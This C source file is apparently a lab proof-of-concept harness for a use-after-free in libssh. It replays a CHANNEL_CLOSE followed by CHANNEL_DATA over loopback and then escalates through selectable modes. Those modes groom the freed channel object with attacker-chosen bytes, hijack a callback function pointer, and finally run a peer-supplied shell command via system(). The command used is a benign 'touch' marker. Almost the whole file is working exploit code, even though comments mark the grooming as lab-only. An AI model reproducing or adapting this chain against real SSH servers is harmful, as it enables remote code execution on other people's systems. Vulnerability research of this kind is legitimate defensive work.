#include "config.h"
/* Real-build replay: authenticated loopback libssh peer sends CHANNEL_CLOSE
 * followed by CHANNEL_DATA; server app frees the channel in its data callback.
 * Built against the pinned vulnerable libssh commit under ASan. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdint.h>
#include <sanitizer/asan_interface.h>
#include <libssh/libssh.h>
#include <libssh/server.h>
#include <libssh/buffer.h>
#include <libssh/callbacks.h>
#include <libssh/session.h>
#include <libssh/channels.h>
#include <libssh/ssh2.h>
#include <libssh/packet.h>
#include <libssh/misc.h>

#define PORT 42229
static volatile int g_done = 0;
static int g_send_close = 1;
static int g_data_packets = 0;
static int g_free_on_data = 1;
static int g_groom = 0;
static int g_survive = 0;
static void *g_saved_buf = NULL;
static void *g_saved_cbs = NULL;
static volatile uint64_t g_target = 0x4141414141414141ull;
static void *g_groom_ptr = NULL;
static int g_call = 0;
static int g_bad_call = 0;
static int g_marker_hits = 0;
static void *g_saved_it = NULL;
static int g_exec = 0;
static int g_exec_rc = -1;
static const char g_exec_cmd[] = "touch evidence-wire-vuln-groom-exec.marker";

static int auth_password(ssh_session s, const char *user, const char *pass, void *u)
{
    (void)s; (void)u;
    int rc = (strcmp(user, "mishe") == 0 && strcmp(pass, "mishe-uaf") == 0) ?
             SSH_AUTH_SUCCESS : SSH_AUTH_DENIED;
    printf("SERVER auth len user=%zu pass=%zu success=%d\n",
           strlen(user), strlen(pass), SSH_AUTH_SUCCESS);
    fflush(stdout);
    return rc;
}

static ssh_channel open_session(ssh_session s, void *u)
{
    (void)u;
    return ssh_channel_new(s);
}

static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
                   int stderr, void *u)
{
    (void)s; (void)stderr; (void)u;
    printf("SERVER data #%d len=%u first=%c%s%c\n", ++g_data_packets, len,
           ((char *)data)[0], len > 16 ? " off16=" : "",
           len > 16 ? ((char *)data)[16] : ' ');
    fflush(stdout);
    if (g_data_packets == 2 && g_free_on_data) {
        /* The app drops the channel as soon as it sees data after close.
         * ssh_channel_free() calls ssh_channel_do_free() because CLOSED_REMOTE
         * is already set: buffers, callbacks and the channel itself are freed
         * while channel_rcv_data() is still running. */
        unsigned char wire[128];
        if (g_groom && len >= 128) {
            memcpy(wire, data, sizeof(wire));
        }
        if (g_survive) {
            /* Lab-only: detach the stdout ssh_buffer and the callback list
             * before the channel free so channel_rcv_data() can reach its
             * later uses after the chosen-pointer write. This is NOT a
             * realistic app pattern. */
            g_saved_buf = ch->stdout_buffer;
            ch->stdout_buffer = NULL;
            g_saved_cbs = ch->callbacks;
            g_saved_it = ssh_list_get_iterator(ch->callbacks);
            ch->callbacks = NULL;
            printf("SERVER groom-survive saved_buf=%p saved_cbs=%p first=%p\n",
                   g_saved_buf, g_saved_cbs, g_saved_it);
            fflush(stdout);
        }
        ssh_channel_free(ch);
        if (g_groom && len >= 128) {
            /* Lab-only groom: the application reuses the just-freed 128-byte
             * channel object for a 128-byte buffer filled with bytes chosen
             * by the authenticated peer. Offset 120 is channel->counter's
             * slot in the pinned layout. */
            void *p = malloc(128);
            uint64_t v = 0;
            if (p != NULL) {
                memcpy(p, wire, sizeof(wire));
                if (g_survive) {
                    /* grow_window() dereferences these two fields after the
                     * write; wire bytes choose NULL for both. */
                    memset((char *)p + 56, 0, 8);  /* stdout_buffer */
                    memset((char *)p + 64, 0, 8);  /* stderr_buffer */
                }
                g_groom_ptr = p;
                memcpy(&v, (char *)p + 120, sizeof(v));
                printf("SERVER groom alloc=%p wire_off120=0x%llx target=%p survive=%d\n",
                       p, (unsigned long long)v, (void *)&g_target, g_survive);
                fflush(stdout);
            }
        }
        if (g_call && len >= 128) {
            /* Lab-only W4: the first list node was kept alive by the detach
             * above. Redirect its next pointer to an app-owned fake callback
             * entry whose function pointer is chosen by wire bytes, so the
             * post-callback ssh_callbacks_iterate executes a chosen address. */
            struct ssh_iterator *first = (struct ssh_iterator *)g_saved_it;
            struct ssh_channel_callbacks_struct *fake;
            struct ssh_iterator *fake_it;
            uint64_t fn = 0;
            memcpy(&fn, wire + 112, sizeof(fn));
            fake = malloc(sizeof(*fake));
            fake_it = malloc(sizeof(*fake_it));
            if (first != NULL && fake != NULL && fake_it != NULL) {
                memset(fake, 0, sizeof(*fake));
                fake->size = sizeof(*fake);
                fake->userdata = g_exec ? g_groom_ptr : NULL;
                fake->channel_data_function =
                    (ssh_channel_data_callback)(uintptr_t)fn;
                fake_it->next = NULL;
                fake_it->data = fake;
                first->next = fake_it;
                printf("SERVER call fake_cbs=%p node=%p fn=0x%llx first=%p\n",
                       (void *)fake, (void *)fake_it,
                       (unsigned long long)fn, (void *)first);
                fflush(stdout);
            }
        }
        g_done = 1;
    }
    return (int)len;
}

static void on_close(ssh_session s, ssh_channel ch, void *u)
{
    (void)s; (void)u;
    printf("SERVER close callback\n");
    fflush(stdout);
}
static int marker_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
                       int stderr, void *u)
{
    (void)s; (void)ch; (void)data; (void)stderr; (void)u;
    g_marker_hits++;
    printf("SERVER MARKER called len=%u hits=%d\n", len, g_marker_hits);
    fflush(stdout);
    return 0;
}
static int exec_trampoline(ssh_session s, ssh_channel ch, void *data,
                           uint32_t len, int stderr, void *u)
{
    const char *cmd = (const char *)u;
    (void)s; (void)ch; (void)data; (void)len; (void)stderr;
    printf("SERVER EXEC trampoline cmd=%s\n", cmd != NULL ? cmd : "(null)");
    fflush(stdout);
    if (cmd == NULL) return 0;
    g_exec_rc = system(cmd);
    printf("SERVER EXEC rc=%d\n", g_exec_rc);
    fflush(stdout);
    return 0;
}



static int run_server(const char *keyfile)
{
    ssh_bind bind = ssh_bind_new();
    ssh_session s;
    ssh_event event;
    struct ssh_server_callbacks_struct scb;
    struct ssh_channel_callbacks_struct ccb;
    int rc;

    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDADDR, "127.0.0.1");
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDPORT, &(int){ PORT });
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_HOSTKEY, keyfile);
    if (ssh_bind_listen(bind) < 0) {
        fprintf(stderr, "bind failed: %s\n", ssh_get_error(bind));
        return 1;
    }
    s = ssh_new();
    if (ssh_bind_accept(bind, s) != SSH_OK) {
        fprintf(stderr, "accept failed: %s\n", ssh_get_error(bind));
        return 1;
    }
    memset(&scb, 0, sizeof(scb));
    scb.auth_password_function = auth_password;
    scb.channel_open_request_session_function = open_session;
    ssh_callbacks_init(&scb);
    ssh_set_server_callbacks(s, &scb);
    ssh_set_auth_methods(s, SSH_AUTH_METHOD_PASSWORD);
    if (ssh_handle_key_exchange(s) != SSH_OK) {
        fprintf(stderr, "server kex failed: %s\n", ssh_get_error(s));
        return 1;
    }
    event = ssh_event_new();
    ssh_event_add_session(event, s);

    memset(&ccb, 0, sizeof(ccb));
    ccb.channel_data_function = on_data;
    ccb.channel_close_function = on_close;
    ssh_callbacks_init(&ccb);
    /* Register on channels as they are opened (first data arrives before we
     * can otherwise reach the channel pointer). */
    for (int i = 0; i < 400 && !g_done; i++) {
        struct ssh_iterator *it;
        int n = 0;
        for (it = ssh_list_get_iterator(s->channels); it != NULL;
             it = ssh_list_get_iterator(s->channels)) {
            ssh_channel ch = (ssh_channel)it->data;
            if (ch != NULL && ch->callbacks == NULL && n++ == 0) {
                ssh_add_channel_callbacks(ch, &ccb);
                printf("SERVER registered callbacks on channel %u\n",
                       ch->local_channel);
                fflush(stdout);
            }
            /* avoid an infinite loop over the same head element */
            break;
        }
        ssh_event_dopoll(event, 100);
    }
    printf("SERVER done data_packets=%d marker_hits=%d\n",
           g_data_packets, g_marker_hits);
    printf("SERVER exec rc=%d\n", g_exec_rc);
    printf("SERVER target_after=0x%llx groom_ptr=%p\n",
           (unsigned long long)g_target, g_groom_ptr);
    if (g_survive) {
        printf("SERVER survive buf_len=%u saved=%p\n",
               g_saved_buf != NULL ?
               ssh_buffer_get_len((ssh_buffer)g_saved_buf) : 0, g_saved_buf);
    }
    fflush(stdout);
    return 0;
}

static int raw_u8(ssh_session s, uint32_t recipient, uint8_t type)
{
    if (ssh_buffer_pack(s->out_buffer, "bd", type, recipient) != SSH_OK)
        return -1;
    return ssh_packet_send(s);
}

static int raw_data_n(ssh_session s, uint32_t recipient, const void *payload,
                      uint32_t n)
{
    if (ssh_buffer_pack(s->out_buffer, "bd", SSH2_MSG_CHANNEL_DATA,
                        recipient) != SSH_OK)
        return -1;
    if (ssh_buffer_pack(s->out_buffer, "dP", n, (size_t)n, payload) != SSH_OK)
        return -1;
    return ssh_packet_send(s);
}

static int raw_data(ssh_session s, uint32_t recipient, const char *payload)
{
    return raw_data_n(s, recipient, payload, (uint32_t)strlen(payload));
}

static int run_client(void)
{
    ssh_session s = ssh_new();
    ssh_channel ch;
    int rc, port = PORT;
    const char marker[] = "MISHE-LIBSSH-UAF-WIRE";

    ssh_options_set(s, SSH_OPTIONS_HOST, "127.0.0.1");
    ssh_options_set(s, SSH_OPTIONS_PORT, &port);
    ssh_options_set(s, SSH_OPTIONS_USER, "mishe");
    if (ssh_connect(s) != SSH_OK) {
        fprintf(stderr, "client connect failed: %s\n", ssh_get_error(s));
        return 1;
    }
    rc = ssh_userauth_password(s, NULL, "mishe-uaf");
    printf("CLIENT auth rc=%d\n", rc);
    fflush(stdout);
    if (rc != SSH_AUTH_SUCCESS) return 1;
    ch = ssh_channel_new(s);
    if (ch == NULL || ssh_channel_open_session(ch) != SSH_OK) {
        fprintf(stderr, "client channel open failed\n");
        return 1;
    }
    printf("CLIENT channel local=%u remote=%u\n", ch->local_channel,
           ch->remote_channel);
    fflush(stdout);
    if (ssh_channel_write(ch, "first-packet", 12) != 12) {
        fprintf(stderr, "client first write failed\n");
        return 1;
    }
    usleep(200000);
    /* Wire-level remote close followed by data: a peer can emit these two
     * packets back to back even though the public write API refuses post-close
     * writes. */
    if (g_send_close) {
        if (raw_u8(s, ch->remote_channel, SSH2_MSG_CHANNEL_CLOSE) != 0) {
            fprintf(stderr, "raw close failed\n");
            return 1;
        }
        usleep(200000);
    }
    usleep(200000);
    if (g_groom) {
        unsigned char payload[128];
        uint64_t want = (uint64_t)(uintptr_t)&g_target;
        memset(payload, 'M', sizeof(payload));
        memcpy(payload, marker, strlen(marker));
        payload[16] = '-';
        memcpy(payload + 120, &want, sizeof(want));
        if (g_call) {
            uint64_t fn = g_bad_call ? 0x4141414141414141ull :
                          (g_exec ? (uint64_t)(uintptr_t)&exec_trampoline :
                           (uint64_t)(uintptr_t)&marker_data);
            memcpy(payload + 112, &fn, sizeof(fn));
            if (g_exec) {
                memcpy(payload, g_exec_cmd, sizeof(g_exec_cmd));
                printf("CLIENT sent exec cmd=%s fn=0x%llx\n",
                       g_exec_cmd, (unsigned long long)fn);
            } else {
                printf("CLIENT sent call fn=0x%llx bad=%d\n",
                       (unsigned long long)fn, g_bad_call);
            }
            fflush(stdout);
        }
        if (g_survive) {
            memset(payload + 56, 0, 8);  /* stdout_buffer */
            memset(payload + 64, 0, 8);  /* stderr_buffer */
        }
        if (raw_data_n(s, ch->remote_channel, payload, sizeof(payload)) != 0) {
            fprintf(stderr, "raw groom data failed\n");
            return 1;
        }
        printf("CLIENT sent groom wire pointer=0x%llx survive=%d\n",
               (unsigned long long)want, g_survive);
    } else if (raw_data(s, ch->remote_channel, marker) != 0) {
        fprintf(stderr, "raw data failed\n");
        return 1;
    }
    usleep(500000);
    printf("CLIENT sent close+data marker=%s\n", marker);
    fflush(stdout);
    ssh_channel_free(ch);
    ssh_disconnect(s);
    ssh_free(s);
    return 0;
}

static void asan_death(void)
{
    printf("SERVER death target=0x%llx\n",
           (unsigned long long)g_target);
    fflush(stdout);
}

int main(int argc, char **argv)
{
    ssh_set_log_level(SSH_LOG_PROTOCOL);
    __asan_set_death_callback(asan_death);
    ssh_init();
    pid_t pid;
    if (argc < 2 || argc > 3) {
        fprintf(stderr,
                "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec]\n",
                argv[0]);
        return 2;
    }
    if (argc == 3 && strcmp(argv[2], "data-only") == 0) {
        g_send_close = 0;
        g_free_on_data = 0;
    } else if (argc == 3 && strcmp(argv[2], "no-free") == 0) {
        g_free_on_data = 0;
    } else if (argc == 3 && strcmp(argv[2], "groom") == 0) {
        g_groom = 1;
    } else if (argc == 3 && strcmp(argv[2], "groom-survive") == 0) {
        g_groom = 1;
        g_survive = 1;
    } else if (argc == 3 && strcmp(argv[2], "groom-call") == 0) {
        g_groom = 1;
        g_survive = 1;
        g_call = 1;
    } else if (argc == 3 && strcmp(argv[2], "groom-call-bad") == 0) {
        g_groom = 1;
        g_survive = 1;
        g_call = 1;
        g_bad_call = 1;
    } else if (argc == 3 && strcmp(argv[2], "groom-exec") == 0) {
        g_groom = 1;
        g_survive = 1;
        g_call = 1;
        g_exec = 1;
    } else if (argc == 3) {
        fprintf(stderr, "unknown mode: %s\n", argv[2]);
        return 2;
    }
    pid = fork();
    if (pid == 0) {
        int rc = run_server(argv[1]);
        _exit(rc);
    }
    usleep(500000);
    int crc = run_client();
    int wstatus = 0;
    waitpid(pid, &wstatus, 0);
    printf("CLIENT rc=%d SERVER status=0x%x\n", crc, wstatus);
    return (crc == 0 && WIFEXITED(wstatus) && WEXITSTATUS(wstatus) == 0) ? 0 : 1;
}
